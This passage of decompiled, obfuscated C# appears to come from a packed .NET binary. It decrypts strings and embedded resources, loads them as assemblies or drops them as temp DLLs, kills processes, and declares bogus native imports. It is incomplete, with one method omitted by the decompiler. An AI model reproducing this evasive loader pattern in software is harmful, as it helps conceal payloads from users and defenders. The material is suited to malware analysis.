        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance1, (Type) null, \u0023\u0023.\u0088(1407), new object[2]
        {
          (object) \u0023\u0023.\u0088(1420),
          (object) \u0023\u0023.\u0088(1425)
        }, (string[]) null, (Type[]) null, (bool[]) null)), (Type) null, \u0023\u0023.\u0088(1407), new object[2]
        {
          (object) '"',
          (object) \u0023\u0023.\u0088(1430)
        }, (string[]) null, (Type[]) null, (bool[]) null)), (Type) null, \u0023\u0023.\u0088(1407), new object[2]
        {
          (object) \u0023\u0023.\u0088(1435),
          (object) \u0023\u0023.\u0088(1440)
        }, (string[]) null, (Type[]) null, (bool[]) null));
        new StringBuilder().Append(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(Operators.ConcatenateObject((object) \u0023\u0023.\u0088(1445), objectValue), (object) \u0023\u0023.\u0088(1498))));
        object Instance2 = (object) null;
        IEnumerator enumerator;
        try
        {
          enumerator = ((IEnumerable) NewLateBinding.LateGet(Instance2, (Type) null, \u0023\u0023.\u0088(1515), new object[0], (string[]) null, (Type[]) null, (bool[]) null)).GetEnumerator();
          while (true)
          {
            *(sbyte*) ((IntPtr) voidPtr + 31) = (sbyte) enumerator.MoveNext();
            if (*(sbyte*) ((IntPtr) voidPtr + 31) != (sbyte) 0)
            {
              str = Conversions.ToString(enumerator.Current);
              *(sbyte*) ((IntPtr) voidPtr + 30) = (sbyte) 0;
            }
            else
              break;
          }
        }
        finally
        {
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Process.GetProcessById(checked ((int) obj1.\u0023H)).Kill();
      \u0023w w = new \u0023w();
      Process.GetCurrentProcess().Kill();
      *(sbyte*) ((IntPtr) voidPtr + 32) = (sbyte) 0;
      *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
      // ISSUE: cast to a reference type
      \u0023\u0023.\u0023Md(15324234L, 21452142152132L, (bool&) ((IntPtr) voidPtr + 12));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  static void \u0023Fd([In] byte[] obj0, [In] int obj1, [In] \u00239b.\u0023wc obj2, [In] int obj3)
  {
    if (obj2.\u0023sc < obj2.\u0023tc)
      throw new InvalidOperationException();
    int num = obj3 + obj1;
    if (0 > obj3 || obj3 > num || num > obj0.Length)
      throw new ArgumentOutOfRangeException();
    if ((obj1 & 1) != 0)
    {
      obj2.\u0023uc |= (uint) (((int) obj0[obj3++] & (int) byte.MaxValue) << obj2.\u0023vc);
      obj2.\u0023vc += 8;
    }
    obj2.\u0023rc = obj0;
    obj2.\u0023sc = obj3;
    obj2.\u0023tc = num;
  }

  static void \u0023Wd([In] \u00239b.\u0023mc obj0, [In] int obj1)
  {
    \u00239b.\u0023mc mc = obj0;
    int yc;
    int num = yc = mc.\u0023yc;
    mc.\u0023yc = yc + 1;
    if (num == 32768)
      throw new InvalidOperationException();
    obj0.\u0023rc[obj0.\u0023xc++] = (byte) obj1;
    obj0.\u0023xc &= (int) short.MaxValue;
  }

  static void \u0023ld([In] \u00239b.\u0023mc obj0, [In] int obj1, [In] int obj2)
  {
    if ((obj0.\u0023yc += obj1) > 32768)
      throw new InvalidOperationException();
    int sourceIndex = obj0.\u0023xc - obj2 & (int) short.MaxValue;
    int num = 32768 - obj1;
    if (sourceIndex <= num && obj0.\u0023xc < num)
    {
      if (obj1 <= obj2)
      {
        Array.Copy((Array) obj0.\u0023rc, sourceIndex, (Array) obj0.\u0023rc, obj0.\u0023xc, obj1);
        obj0.\u0023xc += obj1;
      }
      else
      {
        while (obj1-- > 0)
          obj0.\u0023rc[obj0.\u0023xc++] = obj0.\u0023rc[sourceIndex++];
      }
    }
    else
      \u0023\u0023.\u00230d(obj0, sourceIndex, obj1, obj2);
  }

  static bool \u0023me([In] string obj0) => \u0080.\u0086(obj0).Length > 0;

  static byte[] \u0023ne([In] string obj0, [In] byte[] obj1)
  {
    byte[] numArray1 = new byte[checked (obj1.Length + 1)];
    object obj2 = \u0081.\u0087((object) false);
    int num1 = (int) obj1[checked (obj1.Length - 1)] ^ 112;
    byte[] numArray2 = \u0002.\u007E\u0004((object) \u0001.\u0002(), obj0);
    object obj3 = \u0081.\u0087((object) false);
    object obj4 = \u0081.\u0087((object) false);
    int num2 = checked (obj1.Length - 1);
    int index1 = 0;
    while (index1 <= num2)
    {
      int index2;
      numArray1[index1] = checked ((byte) ((int) obj1[index1] ^ num1 ^ (int) numArray2[index2]));
      if (index2 == checked (\u0082.\u007E\u0088((object) obj0) - 1))
        index2 = 0;
      else
        checked { ++index2; }
      checked { ++index1; }
    }
    object obj5 = \u0081.\u0087((object) false);
    byte[] numArray3 = (byte[]) \u0083.\u0089((Array) numArray1, (Array) new byte[checked (obj1.Length - 2 + 1)]);
    object obj6 = \u0081.\u0087((object) false);
    return numArray3;
  }

  static int \u0023Yd([In] int obj0, [In] \u00239b.\u0023qc obj1, [In] byte[] obj2, [In] int obj3)
  {
    int num1 = 0;
    do
    {
      if (obj1.\u0023fc != 11)
        goto label_5;
label_2:
      continue;
label_5:
      int num2 = \u0023\u0023.\u0023Ld(obj3, obj2, obj0, obj1.\u0023mc);
      obj3 += num2;
      num1 += num2;
      obj0 -= num2;
      if (obj0 != 0)
        goto label_2;
      else
        goto label_1;
    }
    while (\u0023\u0023.\u0023Nd(obj1) || obj1.\u0023mc.\u0023yc > 0 && obj1.\u0023fc != 11);
    goto label_3;
label_1:
    return num1;
label_3:
    return num1;
  }

  static int \u00234d([In] \u00239b.\u0023wc obj0) => obj0.\u0023vc;

  static Assembly \u0023Qd(object _param0, ResolveEventArgs _param1)
  {
    \u0023Ib.\u0023Pb pb = new \u0023Ib.\u0023Pb(_param1.Name);
    string base64String1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(pb.\u0023Nb(false)));
    string[] strArray = "ezY1MDUxNWVmLTRhZmItNDg4MC1hNTY0LTZjMWQ5OWUxMjNiN30sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{7e94b274-e9e1-40fb-a532-6324c51211be},ezY1MDUxNWVmLTRhZmItNDg4MC1hNTY0LTZjMWQ5OWUxMjNiN30=,[z]{7e94b274-e9e1-40fb-a532-6324c51211be}".Split(',');
    string str1 = string.Empty;
    bool flag1 = false;
    bool flag2 = false;
    for (int index = 0; index < strArray.Length - 1; index += 2)
    {
      if (strArray[index] == base64String1)
      {
        str1 = strArray[index + 1];
        break;
      }
    }
    if (str1.Length == 0 && pb.\u0023Mb.Length == 0)
    {
      string base64String2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(pb.\u0023Jb));
      for (int index = 0; index < strArray.Length - 1; index += 2)
      {
        if (strArray[index] == base64String2)
        {
          str1 = strArray[index + 1];
          break;
        }
      }
    }
    if (str1.Length > 0)
    {
      if (str1[0] == '[')
      {
        int num = str1.IndexOf(']');
        string str2 = str1.Substring(1, num - 1);
        flag1 = str2.IndexOf('z') >= 0;
        flag2 = str2.IndexOf('t') >= 0;
        str1 = str1.Substring(num + 1);
      }
      lock (\u0023Ib.\u0023Bb)
      {
        if (\u0023Ib.\u0023Bb.ContainsKey(str1))
          return \u0023Ib.\u0023Bb[str1];
        Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
        if (manifestResourceStream != null)
        {
          int length = (int) manifestResourceStream.Length;
          byte[] numArray = new byte[length];
          manifestResourceStream.Read(numArray, 0, length);
          if (flag1)
            numArray = \u0023\u0023.\u0023Dd(numArray);
          Assembly assembly = (Assembly) null;
          if (!flag2)
          {
            try
            {
              assembly = Assembly.Load(numArray);
            }
            catch (FileLoadException ex)
            {
              flag2 = true;
            }
            catch (BadImageFormatException ex)
            {
              flag2 = true;
            }
          }
          if (flag2)
          {
            try
            {
              string path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
              Directory.CreateDirectory(path1);
              string path2 = path1 + pb.\u0023Jb + ".dll";
              if (!File.Exists(path2))
              {
                FileStream fileStream = File.OpenWrite(path2);
                fileStream.Write(numArray, 0, numArray.Length);
                fileStream.Close();
                \u0023\u0023.\u0023Od(path2, (string) null, 4);
                \u0023\u0023.\u0023Od(path1, (string) null, 4);
              }
              assembly = Assembly.LoadFile(path2);
            }
            catch
            {
            }
          }
          \u0023Ib.\u0023Bb[str1] = assembly;
          return assembly;
        }
      }
    }
    return (Assembly) null;
  }

  static int \u00232d([In] \u00239b.\u0023mc obj0) => obj0.\u0023yc;

  [DllImport("ssssssssss", EntryPoint = "DhcpDeRegisterParamChange", CharSet = CharSet.Ansi, SetLastError = true)]
  static extern long \u0023Gd(int _param0, [MarshalAs(UnmanagedType.AnsiBStr)] ref string _param1);

  static int \u0023Ld([In] int obj0, [In] byte[] obj1, [In] int obj2, [In] \u00239b.\u0023mc obj3)
  {
    int num1 = obj3.\u0023xc;
    if (obj2 > obj3.\u0023yc)
      obj2 = obj3.\u0023yc;
    else
      num1 = obj3.\u0023xc - obj3.\u0023yc + obj2 & (int) short.MaxValue;
    int num2 = obj2;
    int length = obj2 - num1;
    if (length > 0)
    {
      Array.Copy((Array) obj3.\u0023rc, 32768 - length, (Array) obj1, obj0, length);
      obj0 += length;
      obj2 = num1;
    }
    Array.Copy((Array) obj3.\u0023rc, num1 - obj2, (Array) obj1, obj0, obj2);
    obj3.\u0023yc -= num2;
    if (obj3.\u0023yc < 0)
      throw new InvalidOperationException();
    return num2;
  }

  static int \u0023Ud([In] \u00239b.\u0023Xc obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

  static int \u0023md([In] \u00239b.\u0023wc obj0, [In] int obj1)
  {
    if (obj0.\u0023vc < obj1)
      goto label_4;
label_3:
    return (int) ((long) obj0.\u0023uc & (long) ((1 << obj1) - 1));
label_4:
    if (obj0.\u0023sc == obj0.\u0023tc)
      return -1;
    obj0.\u0023uc |= (uint) (((int) obj0.\u0023rc[obj0.\u0023sc++] & (int) byte.MaxValue | ((int) obj0.\u0023rc[obj0.\u0023sc++] & (int) byte.MaxValue) << 8) << obj0.\u0023vc);
    obj0.\u0023vc += 16;
    goto label_3;
  }

  static void \u00236d()
  {
    try
    {
      \u0023Zb.\u0001();
    }
    catch (Exception ex)
    {
    }
  }

  static int \u00233d([In] \u00239b.\u0023mc obj0) => 32768 - obj0.\u0023yc;

  [DllImport("kernel32", EntryPoint = "MoveFileEx")]
  static extern bool \u0023Od(string _param0, string _param1, int _param2);

  [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
  static extern IntPtr \u00237d([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

  static \u00239b.\u0023Cc \u0023ud([In] \u00239b.\u0023Qc obj0)
  {
    byte[] numArray = new byte[obj0.\u0023Jc];
    byte[] destinationArray;
    if (true)
      destinationArray = numArray;
    Array.Copy((Array) obj0.\u0023Gc, obj0.\u0023Ic, (Array) destinationArray, 0, obj0.\u0023Jc);
    return new \u00239b.\u0023Cc(destinationArray);
  }

  static bool \u0023Kd([In] object[] obj0)
  {
    // ISSUE: The method is too long to display (55425 instructions)
  }

  static bool \u0023Nd([In] \u00239b.\u0023qc obj0)
  {
    switch (obj0.\u0023fc)
    {
      case 2:
        if (obj0.\u0023kc)
        {
          obj0.\u0023fc = 12;
          return false;
        }
        int num1 = \u0023\u0023.\u0023md(obj0.\u0023lc, 3);
        if (num1 < 0)
          return false;
        \u0023\u0023.\u0023qd(obj0.\u0023lc, 3);
        if ((num1 & 1) != 0)
          obj0.\u0023kc = true;
        switch (num1 >> 1)
        {
          case 0:
            \u0023\u0023.\u0023sd(obj0.\u0023lc);
            obj0.\u0023fc = 3;
            break;
          case 1:
            obj0.\u0023oc = \u00239b.\u0023Cc.\u0023Ac;
            obj0.\u0023pc = \u00239b.\u0023Cc.\u0023Bc;
            obj0.\u0023fc = 7;
            break;
          case 2:
            obj0.\u0023nc = new \u00239b.\u0023Qc();
            obj0.\u0023fc = 6;
            break;
        }
        return true;
      case 3:
        if ((obj0.\u0023jc = \u0023\u0023.\u0023md(obj0.\u0023lc, 16)) < 0)
          return false;
        \u0023\u0023.\u0023qd(obj0.\u0023lc, 16);
        obj0.\u0023fc = 4;
        goto case 4;
      case 4:
        if (\u0023\u0023.\u0023md(obj0.\u0023lc, 16) < 0)
          return false;
        \u0023\u0023.\u0023qd(obj0.\u0023lc, 16);
        obj0.\u0023fc = 5;
        goto case 5;
      case 5:
        int num2 = \u0023\u0023.\u0023Vd(obj0.\u0023mc, obj0.\u0023lc, obj0.\u0023jc);
        obj0.\u0023jc -= num2;
        if (obj0.\u0023jc != 0)
          return !\u0023\u0023.\u0023Sd(obj0.\u0023lc);
        obj0.\u0023fc = 2;
        return true;
      case 6:
        if (!\u0023\u0023.\u0023wd(obj0.\u0023nc, obj0.\u0023lc))
          return false;
        obj0.\u0023oc = \u0023\u0023.\u0023zd(obj0.\u0023nc);
        obj0.\u0023pc = \u0023\u0023.\u0023ud(obj0.\u0023nc);
        obj0.\u0023fc = 7;
        goto case 7;
      case 7:
      case 8:
      case 9:
      case 10:
        return \u0023\u0023.\u0023od(obj0);
      case 12:
        return false;
      default:
        return false;
    }
  }

  static ICryptoTransform \u0023Pd([In] byte[] obj0, [In] byte[] obj1, [In] bool obj2)
  {
    using (SymmetricAlgorithm symmetricAlgorithm = (SymmetricAlgorithm) new RijndaelManaged())
      return obj2 ? symmetricAlgorithm.CreateDecryptor(obj1, obj0) : symmetricAlgorithm.CreateEncryptor(obj1, obj0);
  }

  static unsafe bool \u0023Jd([In] object[] obj0)
  {
    // ISSUE: untyped stack allocation
    void* voidPtr = (void*) __untypedstackalloc(6);
    *(int*) voidPtr = 1;
    do
    {
      *(sbyte*) ((IntPtr) voidPtr + 5) = (sbyte) \u0023\u0023.\u0023Kd(obj0);
      if (*(sbyte*) ((IntPtr) voidPtr + 5) != (sbyte) 0)
      {
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
        goto label_2;
      }
      else
        *(int*) voidPtr = checked (*(int*) voidPtr + 1);
    }
    while (*(int*) voidPtr <= 7);
    *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
label_2:
    return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
  }

  static void \u0023yd([In] byte[] obj0, [In] \u00239b.\u0023Cc obj1)
  {
    int[] numArray1 = new int[16];
    int[] numArray2 = new int[16];
    for (int index1 = 0; index1 < obj0.Length; ++index1)
    {
      int index2 = (int) obj0[index1];
      if (index2 > 0)
        ++numArray1[index2];
    }
    int num1 = 0;
    int length = 512;
    for (int index = 1; index <= 15; ++index)
    {
      numArray2[index] = num1;
      num1 += numArray1[index] << 16 - index;
      if (index >= 10)
      {
        int num2 = numArray2[index] & 130944;
        int num3 = num1 & 130944;
        length += num3 - num2 >> 16 - index;
      }
    }
    obj1.\u0023zc = new short[length];
    int num4 = 512;
    for (int index3 = 15; index3 >= 10; --index3)
    {
      int num5 = num1 & 130944;
      num1 -= numArray1[index3] << 16 - index3;
      for (int index4 = num1 & 130944; index4 < num5; index4 += 128)
      {
        obj1.\u0023zc[(int) \u0023\u0023.\u0023xd(index4)] = (short) (-num4 << 4 | index3);
        num4 += 1 << index3 - 9;
      }
    }
    for (int index5 = 0; index5 < obj0.Length; ++index5)
    {
      int index6 = (int) obj0[index5];
      if (index6 != 0)
      {
        int num6 = numArray2[index6];
        int index7 = (int) \u0023\u0023.\u0023xd(num6);
        if (index6 <= 9)
        {
          do
          {
            obj1.\u0023zc[index7] = (short) (index5 << 4 | index6);
            index7 += 1 << index6;
          }
          while (index7 < 512);
        }
        else
        {
          int num7 = (int) obj1.\u0023zc[index7 & 511];
          int num8 = 1 << (num7 & 15);
          int num9 = -(num7 >> 4);
          do
          {
            obj1.\u0023zc[num9 | index7 >> 9] = (short) (index5 << 4 | index6);
            index7 += 1 << index6;
          }
          while (index7 < num8);
        }
        numArray2[index6] = num6 + (1 << 16 - index6);
      }
    }
  }

  static unsafe string \u0023nd([In] string obj0)
  {
    // ISSUE: untyped stack allocation
    void* voidPtr = (void*) __untypedstackalloc(12);
    string password = \u0023\u0023.\u0088(1913);
    string s1 = \u0023\u0023.\u0088(1913);
    string str = \u0023\u0023.\u0088(1934);
    *(int*) voidPtr = 2;
    string s2 = \u0023\u0023.\u0088(1943);
    *(int*) ((IntPtr) voidPtr + 4) = 256;
    byte[] bytes1 = Encoding.ASCII.GetBytes(s2);
    byte[] bytes2 = Encoding.ASCII.GetBytes(s1);
    byte[] buffer = Convert.FromBase64String(obj0);
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes2, *(int*) voidPtr);
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    byte[] bytes3 = rfc2898DeriveBytes.GetBytes(*(int*) ((IntPtr) voidPtr + 4) / 8);
    MemoryStream memoryStream = new MemoryStream(buffer);
    ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(bytes3, bytes1);
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
    rijndaelManaged.Mode = CipherMode.CBC;
    byte[] numArray = new byte[checked (buffer.Length - 1 + 1)];
    *(int*) ((IntPtr) voidPtr + 8) = cryptoStream.Read(numArray, 0, numArray.Length);
    memoryStream.Close();
    cryptoStream.Close();
    return Encoding.UTF8.GetString(numArray, 0, *(int*) ((IntPtr) voidPtr + 8));
  }

  [DllImport("fff.dll", EntryPoint = "d", CharSet = CharSet.Ansi, SetLastError = true)]
  static extern long \u0023Md([In] long obj0, [In] long obj1, [In] ref bool obj2);

  static \u0023\u0023() => Strings.CreateGetStringDelegate(typeof (\u0023\u0023));
}
